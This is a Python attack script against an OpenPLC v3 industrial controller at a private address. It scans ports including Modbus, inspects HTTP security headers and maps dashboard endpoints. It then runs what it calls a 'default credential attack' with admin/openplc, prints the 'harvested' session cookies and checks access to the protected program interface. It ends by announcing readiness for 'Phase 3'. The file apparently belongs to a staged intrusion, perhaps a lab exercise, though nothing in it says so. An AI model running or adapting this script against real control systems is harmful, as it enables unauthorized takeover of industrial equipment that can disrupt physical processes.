import requests
import socket
from urllib.parse import urljoin
import sys

TARGET_IP = "10.97.0.103"
PORT_HTTP = 8080
PORT_MODBUS = 502
BASE_URL = f"http://{TARGET_IP}:{PORT_HTTP}"

# ANSI Colors for rich terminal output
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

def banner():
    print(f"{CYAN}{BOLD}")
    print("=" * 65)
    print("  OPENPLC V3 ADVANCED RECONNAISSANCE & SESSION ACQUISITION")
    print("  Target: " + TARGET_IP + " | Framework: Flask / IEC61131-3")
    print("=" * 65)
    print(f"{RESET}")

def scan_ports():
    print(f"{YELLOW}[*] Phase 2.1: Perimeter Port & Service Enumeration{RESET}")
    ports = {PORT_HTTP: "HTTP Management Dashboard", PORT_MODBUS: "Modbus TCP Execution Daemon", 80: "HTTP Alternate", 22: "SSH Service"}
    for port, desc in ports.items():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        result = s.connect_ex((TARGET_IP, port))
        if result == 0:
            print(f"    [ {GREEN}OPEN{RESET} ] Port {port:<5} ({desc})")
        else:
            print(f"    [ {RED}CLOSED{RESET} ] Port {port:<5} ({desc})")
    print()

def inspect_http_perimeter():
    print(f"{YELLOW}[*] Phase 2.2: HTTP Header & Security Posture Analysis{RESET}")
    try:
        resp = requests.get(BASE_URL, timeout=5)
        print(f"    Target URL           : {BASE_URL}")
        print(f"    Response Status Code : {resp.status_code}")
        print(f"    Server Banner        : {resp.headers.get('Server', 'Hidden / None')}")
        print(f"    Content-Type         : {resp.headers.get('Content-Type', 'Unknown')}")
        
        # Check security headers
        sec_headers = ['X-Frame-Options', 'X-XSS-Protection', 'Content-Security-Policy', 'Strict-Transport-Security']
        print("    Security Header Audit:")
        for h in sec_headers:
            val = resp.headers.get(h)
            if val:
                print(f"      - {h}: {GREEN}{val}{RESET}")
            else:
                print(f"      - {h}: {RED}Not Present{RESET}")
        print()
        return resp.cookies
    except requests.exceptions.RequestException as e:
        print(f"    {RED}[!] Connection error during HTTP inspection: {e}{RESET}\n")
        return None

def enumerate_endpoints(session=None):
    print(f"{YELLOW}[*] Phase 2.3: Industrial Dashboard Endpoint Mapping{RESET}")
    endpoints = [
        "/",
        "/login",
        "/dashboard",
        "/programs",
        "/hardware",
        "/ide",
        "/compilation-logs",
        "/settings",
        "/logout"
    ]
    
    client = session if session else requests.Session()
    for ep in endpoints:
        target = urljoin(BASE_URL, ep)
        try:
            r = client.get(target, timeout=3, allow_redirects=False)
            status_color = GREEN if r.status_code == 200 else (YELLOW if r.status_code in [301, 302] else RED)
            print(f"    Endpoint {ep:<20} -> Status: {status_color}{r.status_code}{RESET}")
        except Exception:
            print(f"    Endpoint {ep:<20} -> {RED}TIMEOUT / ERROR{RESET}")
    print()

def acquire_and_validate_session():
    print(f"{YELLOW}[*] Phase 2.4: Default Credential Attack & Session Harvesting{RESET}")
    login_url = urljoin(BASE_URL, "/login")
    session = requests.Session()
    
    try:
        # Prime cookie jar
        session.get(login_url, timeout=5)
        
        payload = {
            "username": "admin",
            "password": "openplc"
        }
        
        print(f"    Attempting authentication with credentials [ admin / openplc ]...")
        resp_post = session.post(login_url, data=payload, allow_redirects=True, timeout=5)
        
        if resp_post.status_code == 200:
            cookies = session.cookies.get_dict()
            print(f"    {GREEN}[+] Authentication Successful!{RESET}")
            print(f"    Harvested Session Cookies: {CYAN}{cookies}{RESET}")
            
            # Verify restricted access
            programs_resp = session.get(urljoin(BASE_URL, "/programs"), timeout=5)
            if programs_resp.status_code == 200 and "program" in programs_resp.text.lower():
                print(f"    {GREEN}[+] Access to Protected '/programs' Interface Confirmed.{RESET}")
            return session
        else:
            print(f"    {RED}[-] Authentication failed with status {resp_post.status_code}{RESET}")
            return None
    except Exception as e:
        print(f"    {RED}[!] Exception during session acquisition: {e}{RESET}")
        return None

if __name__ == "__main__":
    banner()
    scan_ports()
    inspect_http_perimeter()
    
    # Run initial unauthenticated endpoint mapping
    enumerate_endpoints()
    
    # Execute default credential attack and secure session
    authed_session = acquire_and_validate_session()
    
    if authed_session:
        print(f"\n{GREEN}[+] Reconnaissance & Session Acquisition Complete. Ready for Phase 3!{RESET}")
    else:
        print(f"\n{RED}[-] Session acquisition failed. Check target connectivity.{RESET}")